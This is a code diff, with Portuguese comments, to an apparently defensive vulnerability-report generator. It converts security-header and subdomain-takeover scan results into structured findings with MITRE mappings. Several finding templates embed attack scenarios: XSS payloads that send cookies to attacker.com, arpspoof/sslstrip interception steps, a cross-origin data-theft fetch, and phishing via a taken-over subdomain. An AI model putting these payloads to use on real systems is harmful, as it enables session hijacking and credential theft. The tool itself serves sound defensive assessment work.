@@ -638,6 +638,7 @@ def call_groq(system_prompt: str, data_context: str, model: str) -> str:
         json={
             "model"      : model,
             "temperature": 0.1,
+            "max_tokens" : 8192,
             "messages"   : [
                 {"role": "system", "content": system_prompt},
                 {"role": "user",   "content": data_context},
@@ -799,6 +800,168 @@ def save_analysis(target: str, analysis: dict) -> str:
     return str(filename)
 
 
+
+# ── Conversores determinísticos ──────────────────────────────────────────
+#
+# Transformam outputs de agentes upstream em findings do schema Finding
+# SEM passar pelo LLM. O modelo analisa apenas o que esses conversores
+# não cobrem (infraestrutura, CVEs, portas).
+
+def _convert_header_findings(header_data: dict) -> list[dict]:
+    """
+    Converte findings do header_agent para o schema Finding.
+    Agrupa por tema (5 grupos máximo) para não inflar o output.
+    """
+    if not header_data or header_data.get("error"):
+        return []
+    raw_findings: list[dict] = header_data.get("findings", [])
+    if not raw_findings:
+        return []
+
+    converted: list[dict] = []
+    f_id = 1
+
+    # Grupo 1: HTTPS/HSTS
+    tls_group = [f for f in raw_findings if f.get("type") in ("no_ssl", "missing_strict_transport_security")]
+    if tls_group:
+        evidences = [f.get("evidence", "") for f in tls_group if f.get("evidence")]
+        converted.append({
+            "id": f"H-{f_id:03d}", "title": "HTTPS indisponivel e HSTS ausente",
+            "severity": "HIGH", "category": "Transport Security",
+            "mitre_id": "T1557", "mitre_name": "Adversary-in-the-Middle",
+            "mitre_attack": {"technique_id": "T1557", "technique": "Adversary-in-the-Middle"},
+            "description": "Servidor responde apenas em HTTP. Todo trafego transitado em texto claro. HSTS ausente impede que browsers forcam HTTPS, habilitando downgrade de protocolo.",
+            "evidence": " | ".join(evidences[:2]),
+            "exploitation": {"complexity": "BAIXA", "realistic_scenario": "1. Atacante em rede intermediaria executa: arpspoof -i eth0 -t <vitima> <gateway>. 2. sslstrip intercepta requisicoes HTTPS e as serve como HTTP. 3. Credenciais e cookies de sessao capturados em texto claro com Wireshark."},
+            "recommendation": {"priority": "HIGH", "action": "Configurar TLS valido e adicionar: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload", "verification": "curl -I http://alvo | grep -i strict-transport"},
+            "_source": "header_agent",
+        })
+        f_id += 1
+
+    # Grupo 2: Headers de protecao (CSP, XFO, Permissions)
+    protection_types = {"missing_content_security_policy", "missing_x_frame_options", "missing_permissions_policy", "missing_x_content_type_options", "missing_referrer_policy"}
+    protection_group = [f for f in raw_findings if f.get("type") in protection_types]
+    if protection_group:
+        missing_names = [f.get("title", "").replace("Header ", "").replace(" ausente", "") for f in protection_group]
+        converted.append({
+            "id": f"H-{f_id:03d}", "title": f"Headers de protecao ausentes: {', '.join(missing_names[:3])}",
+            "severity": "MEDIUM" if len(protection_group) >= 2 else "LOW", "category": "Security Headers",
+            "mitre_id": "T1185", "mitre_name": "Browser Session Hijacking",
+            "mitre_attack": {"technique_id": "T1185", "technique": "Browser Session Hijacking"},
+            "description": f"Ausencia simultanea de {len(protection_group)} headers de protecao. CSP ausente habilita XSS. X-Frame-Options ausente habilita clickjacking. Permissions-Policy ausente remove controle sobre APIs do browser.",
+            "evidence": f"{len(protection_group)} headers ausentes: {', '.join(missing_names)}",
+            "exploitation": {"complexity": "MEDIA", "realistic_scenario": "1. Atacante encontra input refletido na aplicacao. 2. Injeta: <script>fetch('https://attacker.com/?c='+document.cookie)</script>. 3. Sem CSP, script executa inline e exfiltra cookie de sessao. 4. Session hijacking com token roubado."},
+            "recommendation": {"priority": "MEDIUM", "action": "Adicionar: Content-Security-Policy: default-src self; X-Frame-Options: DENY; Permissions-Policy: geolocation=(), microphone=(), camera=()", "verification": "curl -I http://alvo | grep -iE 'content-security|x-frame|permissions'"},
+            "_source": "header_agent",
+        })
+        f_id += 1
+
+    # Grupo 3: Info leakage
+    leakage_group = [f for f in raw_findings if f.get("type", "").startswith("info_leak_")]
+    if leakage_group:
+        evidences = [f.get("evidence", "") for f in leakage_group if f.get("evidence")]
+        converted.append({
+            "id": f"H-{f_id:03d}", "title": "Information leakage via headers HTTP",
+            "severity": "LOW", "category": "Information Disclosure",
+            "mitre_id": "T1592.002", "mitre_name": "Gather Victim Host Information: Software",
+            "mitre_attack": {"technique_id": "T1592.002", "technique": "Gather Victim Host Information: Software"},
+            "description": "Headers HTTP revelam versao do servidor e stack de backend. Reduz esforco de reconhecimento — atacante usa versao exposta para buscar CVEs especificos sem fingerprinting ativo.",
+            "evidence": " | ".join(evidences[:3]),
+            "exploitation": {"complexity": "TRIVIAL", "realistic_scenario": "1. curl -I http://alvo captura headers. 2. Server/X-Powered-By revela tecnologia e versao. 3. Busca CVEs em vulners.com ou NVD para a versao especifica. 4. Prioriza exploits publicos disponiveis."},
+            "recommendation": {"priority": "LOW", "action": "Remover headers: ServerTokens Prod (Apache) | server_tokens off (Nginx)", "verification": "curl -I http://alvo | grep -iE 'server|x-powered'"},
+            "_source": "header_agent",
+        })
+        f_id += 1
+
+    # Grupo 4: Cookie flags
+    cookie_types = {"cookie_no_secure", "cookie_no_httponly", "cookie_no_samesite"}
+    cookie_group = [f for f in raw_findings if f.get("type") in cookie_types]
+    if cookie_group:
+        missing_flags = []
+        if any(f.get("type") == "cookie_no_secure"   for f in cookie_group): missing_flags.append("Secure")
+        if any(f.get("type") == "cookie_no_httponly" for f in cookie_group): missing_flags.append("HttpOnly")
+        if any(f.get("type") == "cookie_no_samesite" for f in cookie_group): missing_flags.append("SameSite")
+        converted.append({
+            "id": f"H-{f_id:03d}", "title": f"Cookies sem flags de seguranca: {', '.join(missing_flags)}",
+            "severity": "MEDIUM", "category": "Session Security",
+            "mitre_id": "T1185", "mitre_name": "Browser Session Hijacking",
+            "mitre_attack": {"technique_id": "T1185", "technique": "Browser Session Hijacking"},
+            "description": f"Cookies sem flags {', '.join(missing_flags)}. Sem HttpOnly: cookie acessivel via JS. Sem Secure: transmitido em HTTP. Sem SameSite: vulneravel a CSRF.",
+            "evidence": cookie_group[0].get("evidence", "")[:200] if cookie_group else "",
+            "exploitation": {"complexity": "BAIXA", "realistic_scenario": "1. XSS via input: <script>new Image().src='https://attacker.com/?c='+document.cookie</script>. 2. Sem HttpOnly, document.cookie retorna session token. 3. curl -H 'Cookie: session=<token>' http://alvo/dashboard — acesso autenticado."},
+            "recommendation": {"priority": "MEDIUM", "action": "Set-Cookie: session=<valor>; Secure; HttpOnly; SameSite=Strict", "verification": "curl -I http://alvo | grep -i set-cookie"},
+            "_source": "header_agent",
+        })
+        f_id += 1
+
+    # Grupo 5: CORS wildcard
+    cors_finding = next((f for f in raw_findings if f.get("type") == "cors_wildcard"), None)
+    if cors_finding:
+        converted.append({
+            "id": f"H-{f_id:03d}", "title": "CORS configurado com wildcard (*)",
+            "severity": "MEDIUM", "category": "API Security",
+            "mitre_id": "T1190", "mitre_name": "Exploit Public-Facing Application",
+            "mitre_attack": {"technique_id": "T1190", "technique": "Exploit Public-Facing Application"},
+            "description": "Access-Control-Allow-Origin: * permite que qualquer origem acesse recursos da API. Em endpoints autenticados, site malicioso pode ler dados da resposta cross-origin.",
+            "evidence": cors_finding.get("evidence", ""),
+            "exploitation": {"complexity": "BAIXA", "realistic_scenario": "1. Vitima acessa site malicioso autenticada na aplicacao alvo. 2. Script executa: fetch('https://alvo/api/user', {credentials:'include'}). 3. CORS wildcard permite leitura da resposta com dados do perfil. 4. Dados exfiltrados para C2."},
+            "recommendation": {"priority": "MEDIUM", "action": "Restringir: Access-Control-Allow-Origin: https://seudominio.com", "verification": "curl -H 'Origin: https://evil.com' -I http://alvo/api | grep -i access-control"},
+            "_source": "header_agent",
+        })
+        f_id += 1
+
+    logger.info(f"[ai_analyst] Header findings pre-convertidos: {len(converted)} grupos")
+    return converted
+
+
+def _convert_subdomain_findings(subdomain_data: dict) -> list[dict]:
+    """Converte takeover candidates em findings CRITICAL determinísticos."""
+    if not subdomain_data or subdomain_data.get("error"):
+        return []
+    candidates = subdomain_data.get("takeover_candidates", [])
+    if not candidates:
+        return []
+    converted: list[dict] = []
+    for i, tc in enumerate(candidates, 1):
+        converted.append({
+            "id": f"S-{i:03d}", "title": f"Subdomain takeover — {tc.get('name')}",
+            "severity": "CRITICAL", "category": "Subdomain Takeover",
+            "mitre_id": "T1584.001", "mitre_name": "Compromise Infrastructure: Domains",
+            "mitre_attack": {"technique_id": "T1584.001", "technique": "Compromise Infrastructure: Domains"},
+            "description": f"Subdominio {tc.get('name')} tem CNAME apontando para {tc.get('cname')} ({tc.get('takeover_service')}), recurso nao reivindicado. Atacante pode registrar o recurso e controlar conteudo servido sob o dominio legitimo.",
+            "evidence": f"CNAME: {tc.get('name')} -> {tc.get('cname')} | Servico: {tc.get('takeover_service')}",
+            "exploitation": {"complexity": "TRIVIAL", "realistic_scenario": f"1. Confirmar CNAME: dig CNAME {tc.get('name')}. 2. Registrar conta no servico ({tc.get('takeover_service')}) e reivindicar o nome. 3. Hospedar pagina de phishing sob dominio legitimo. 4. Vitimas confiam na URL — credenciais coletadas."},
+            "recommendation": {"priority": "CRITICAL", "action": f"Remover CNAME de {tc.get('name')} imediatamente ou reivindicar o recurso", "verification": f"dig CNAME {tc.get('name')} deve retornar NXDOMAIN"},
+            "_source": "subdomain_agent",
+        })
+    logger.info(f"[ai_analyst] Takeover findings pre-convertidos: {len(converted)}")
+    return converted
+
+
+def _merge_findings(llm_findings: list[dict], confirmed_findings: list[dict]) -> list[dict]:
+    """
+    Merge findings LLM + findings confirmados dos agentes.
+    Findings confirmados tem prioridade. Deduplica por mitre_id + category.
+    Ordena: CRITICAL -> HIGH -> MEDIUM -> LOW -> INFO
+    """
+    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
+    confirmed_keys: set[str] = set()
+    for f in confirmed_findings:
+        confirmed_keys.add(f"{f.get('mitre_id', '')}:{f.get('category', '')}")
+    filtered_llm: list[dict] = []
+    for f in llm_findings:
+        mitre = f.get("mitre_attack") or {}
+        mid   = (mitre.get("technique_id") if isinstance(mitre, dict) else "") or f.get("mitre_id", "")
+        if f"{mid}:{f.get('category', '')}" not in confirmed_keys:
+            filtered_llm.append(f)
+    merged = confirmed_findings + filtered_llm
+    merged.sort(key=lambda x: severity_order.get(x.get("severity", "INFO"), 4))
+    logger.info(
+        f"[ai_analyst] Merge: {len(confirmed_findings)} confirmados + "
+        f"{len(filtered_llm)} LLM (descartados: {len(llm_findings) - len(filtered_llm)}) = {len(merged)} total"
+    )
+    return merged
+
 # ── Entry point ───────────────────────────────────────────────────────────
 
 def run(
@@ -861,10 +1024,10 @@ def run(
         context_parts += _build_enrichment_block(enrichment_data)
 
     # blocos dos novos agentes
-    if subdomain_data and "error" not in subdomain_data:
+    if subdomain_data and not subdomain_data.get("error"):
         context_parts += _build_subdomain_block(subdomain_data)
 
-    if header_data and "error" not in header_data:
+    if header_data and not header_data.get("error"):
         context_parts += _build_header_block(header_data)
 
     # instrução final — agora ciente dos novos agentes
@@ -900,6 +1063,16 @@ def run(
         return analysis
 
     analysis = parse_response(raw_response)
+
+    # ── Merge determinístico: findings confirmados + LLM ─────────────────
+    # Converte findings dos agentes upstream para o schema Finding.
+    # O LLM pode ter gerado findings de headers/subdomains — o merge
+    # descarta sobreposições e mantém os confirmados com prioridade.
+    confirmed_findings = _convert_header_findings(header_data) +                          _convert_subdomain_findings(subdomain_data)
+    if confirmed_findings:
+        llm_findings   = analysis.get("findings", [])
+        analysis["findings"] = _merge_findings(llm_findings, confirmed_findings)
+
     analysis.update({
         "target"     : target,
         "analyzed_at": datetime.now().isoformat(),
